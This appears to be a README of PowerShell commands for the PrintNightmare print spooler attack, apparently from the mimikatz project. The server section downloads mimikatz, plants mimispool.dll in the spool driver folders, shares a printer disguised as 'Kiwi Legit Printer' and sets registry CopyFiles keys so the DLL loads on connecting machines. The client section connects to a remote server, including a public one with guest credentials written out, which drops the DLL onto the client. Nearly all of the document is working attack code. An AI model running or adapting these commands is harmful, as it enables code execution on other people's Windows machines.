## PowerShell commands

### Server

#### install
```
$printerName     = 'Kiwi Legit Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'
$RegStartPrinter = 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Print\Printers\' + $printerName

Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile '.\mimikatz_trunk.zip'
Expand-Archive -Path '.\mimikatz_trunk.zip' -DestinationPath '.\mimikatz_trunk'

Copy-Item -Force -Path ($system32 + '\mscms.dll')             -Destination ($system32 + '\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\x64\mimispool.dll'   -Destination ($drivers  + '\x64\3\mimispool.dll')
Copy-Item -Force -Path '.\mimikatz_trunk\win32\mimispool.dll' -Destination ($drivers  + '\W32X86\3\mimispool.dll')

Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210729/KyoClassicUniversalKPDL_v3.3_minimal.zip' -OutFile '.\KyoClassicUniversalKPDL_v3.3_minimal.zip'
Expand-Archive -Path '.\KyoClassicUniversalKPDL_v3.3_minimal.zip' -DestinationPath '.\KyoClassicUniversalKPDL_v3.3_minimal'

pnputil /add-driver '.\KyoClassicUniversalKPDL_v3.3_minimal\OEMSETUP.inf' /install

Add-PrinterDriver -Name       'Kyocera Classic Universaldriver KPDL' -PrinterEnvironment 'Windows x64'
# Add-PrinterDriver -Name       'Kyocera Classic Universaldriver KPDL' -PrinterEnvironment 'Windows NT x86'
# little bug bypass here :(
rundll32 printui,PrintUIEntry /ia /m 'Kyocera Classic Universaldriver KPDL' /h x86 /f '.\KyoClassicUniversalKPDL_v3.3_minimal\OEMSETUP.inf'

Add-Printer       -DriverName 'Kyocera Classic Universaldriver KPDL' -Name ($printerName + ' - x64') -PortName 'FILE:' -Shared
Add-Printer       -DriverName 'Kyocera Classic Universaldriver KPDL' -Name ($printerName + ' - x86') -PortName 'FILE:' -Shared

New-Item         -Path ($RegStartPrinter + ' - x64\CopyFiles')        | Out-Null
New-Item         -Path ($RegStartPrinter + ' - x64\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x64\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'x64\3'           | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x64\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x64\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + ' - x64\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x64\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x64\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x64\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null

New-Item         -Path ($RegStartPrinter + ' - x86\CopyFiles')        | Out-Null
New-Item         -Path ($RegStartPrinter + ' - x86\CopyFiles\Kiwi')   | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x86\CopyFiles\Kiwi')   -Name 'Directory' -PropertyType 'String'      -Value 'W32X86\3'        | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x86\CopyFiles\Kiwi')   -Name 'Files'     -PropertyType 'MultiString' -Value ('mimispool.dll') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x86\CopyFiles\Kiwi')   -Name 'Module'    -PropertyType 'String'      -Value 'mscms.dll'       | Out-Null
New-Item         -Path ($RegStartPrinter + ' - x86\CopyFiles\Litchi') | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x86\CopyFiles\Litchi') -Name 'Directory' -PropertyType 'String'      -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x86\CopyFiles\Litchi') -Name 'Files'     -PropertyType 'MultiString' -Value $null             | Out-Null
New-ItemProperty -Path ($RegStartPrinter + ' - x86\CopyFiles\Litchi') -Name 'Module'    -PropertyType 'String'      -Value 'mimispool.dll'   | Out-Null

```

#### uninstall
```
$printerName     = 'Kiwi Legit Printer'
$system32        = $env:systemroot + '\system32'
$drivers         = $system32 + '\spool\drivers'

Remove-Printer -Name ($printerName + ' - x86')
Remove-Printer -Name ($printerName + ' - x64')
Start-Sleep -Seconds 2
Remove-PrinterDriver -Name 'Kyocera Classic Universaldriver KPDL' -PrinterEnvironment 'Windows NT x86' # -RemoveFromDriverStore
Remove-PrinterDriver -Name 'Kyocera Classic Universaldriver KPDL' -PrinterEnvironment 'Windows x64' -RemoveFromDriverStore

Remove-Item -Force -Path ($drivers  + '\x64\3\mimispool.dll')
Remove-Item -Force -Path ($drivers  + '\W32X86\3\mimispool.dll')
Remove-Item -Force -Path ($system32 + '\mimispool.dll')

```

### Client

#### Any computer with explicit credential to `printnightmare.gentilkiwi.com`
```
$serverName  = 'printnightmare.gentilkiwi.com'
$username    = 'gentilguest'
$password    = 'password'
$printerName = 'Kiwi Legit Printer'

$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})
$credential = (New-Object System.Management.Automation.PSCredential($username, (ConvertTo-SecureString -AsPlainText -String $password -Force)))

Remove-PSDrive -Force -Name 'KiwiLegitPrintServer' -ErrorAction SilentlyContinue
Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue

New-PSDrive -Name 'KiwiLegitPrintServer' -Root ('\\' + $serverName + '\print$') -PSProvider FileSystem -Credential $credential | Out-Null
Add-Printer -ConnectionName $fullprinterName

$driver = (Get-Printer -Name $fullprinterName).DriverName
Remove-Printer -Name $fullprinterName
Remove-PrinterDriver -Name $driver # not removed from DriverStore (not admin)
Remove-PSDrive -Force -Name 'KiwiLegitPrintServer'
# mimispool still in spool\drivers

```


#### Computer in domain (single sign on with current user to print server)
```
$serverName  = 'print.lab.local'
$printerName = 'Kiwi Legit Printer'

$fullprinterName = '\\' + $serverName + '\' + $printerName + ' - ' + $(If ([System.Environment]::Is64BitOperatingSystem) {'x64'} Else {'x86'})

Remove-Printer -Name $fullprinterName -ErrorAction SilentlyContinue
Add-Printer -ConnectionName $fullprinterName

$driver = (Get-Printer -Name $fullprinterName).DriverName
Remove-Printer -Name $fullprinterName
Remove-PrinterDriver -Name $driver # not removed from DriverStore (not admin)
# mimispool still in spool\drivers

```
